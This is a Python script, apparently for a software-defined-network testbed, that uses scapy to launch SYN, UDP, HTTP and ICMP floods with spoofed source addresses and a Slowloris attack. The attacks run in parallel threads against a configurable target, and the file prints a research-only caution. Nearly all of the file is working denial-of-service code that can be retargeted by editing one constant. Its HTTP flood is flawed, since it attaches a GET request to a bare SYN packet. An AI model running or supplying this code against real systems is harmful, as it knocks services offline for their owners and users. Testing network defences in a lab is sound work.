from scapy.all import *
import random
import time
import threading

# Constants
SOURCE_IP_RANGE = ("10.0.0.1", "10.0.0.18")
DESTINATION_IP = "10.0.0.2"  # Assume this is your target server in the SDN testbed
ATTACK_DURATION = 60  # Duration of the attack in seconds
THREADS = 5  # Number of parallel threads

def generate_random_ip():
    return f"{random.randint(10,10)}.{random.randint(0,0)}.{random.randint(0,0)}.{random.randint(1,18)}"

def syn_flood():
    start_time = time.time()
    while time.time() - start_time < ATTACK_DURATION:
        source_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 4294967295)
        window = random.randint(1000, 65535)
        
        ip = IP(src=generate_random_ip(), dst=DESTINATION_IP)
        tcp = TCP(sport=source_port, dport=80, flags="S", seq=seq_num, window=window)
        
        send(ip/tcp, verbose=False)
        time.sleep(0.01)

def udp_flood():
    start_time = time.time()
    while time.time() - start_time < ATTACK_DURATION:
        source_port = random.randint(1024, 65535)
        payload = Raw(RandString(size=random.randint(64, 1464)))
        
        ip = IP(src=generate_random_ip(), dst=DESTINATION_IP)
        udp = UDP(sport=source_port, dport=53)
        
        send(ip/udp/payload, verbose=False)
        time.sleep(0.01)

def http_flood():
    start_time = time.time()
    while time.time() - start_time < ATTACK_DURATION:
        source_port = random.randint(1024, 65535)
        
        ip = IP(src=generate_random_ip(), dst=DESTINATION_IP)
        tcp = TCP(sport=source_port, dport=80, flags="S")
        payload = Raw("GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
        
        send(ip/tcp/payload, verbose=False)
        time.sleep(0.01)

def icmp_flood():
    start_time = time.time()
    while time.time() - start_time < ATTACK_DURATION:
        ip = IP(src=generate_random_ip(), dst=DESTINATION_IP)
        icmp = ICMP()
        
        send(ip/icmp, verbose=False)
        time.sleep(0.01)

def slowloris():
    start_time = time.time()
    sockets = []
    
    while time.time() - start_time < ATTACK_DURATION:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((DESTINATION_IP, 80))
            s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {DESTINATION_IP}\r\n".encode("utf-8"))
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            sockets.append(s)
        except:
            pass
        
        for s in sockets:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except:
                sockets.remove(s)
        
        time.sleep(15)

def launch_attack(attack_type):
    print(f"Starting {attack_type} attack...")
    threads = []
    for _ in range(THREADS):
        if attack_type == "SYN Flood":
            t = threading.Thread(target=syn_flood)
        elif attack_type == "UDP Flood":
            t = threading.Thread(target=udp_flood)
        elif attack_type == "HTTP Flood":
            t = threading.Thread(target=http_flood)
        elif attack_type == "ICMP Flood":
            t = threading.Thread(target=icmp_flood)
        elif attack_type == "Slowloris":
            t = threading.Thread(target=slowloris)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print(f"{attack_type} attack completed.")

if __name__ == "__main__":
    print("DDoS Attack Simulation for Research Purposes")
    print("CAUTION: Use only in controlled environments with permission")
    
    attacks = ["SYN Flood", "UDP Flood", "HTTP Flood", "ICMP Flood", "Slowloris"]
    
    for attack in attacks:
        launch_attack(attack)
        time.sleep(5)  # Pause between attacks

print("All simulations completed.")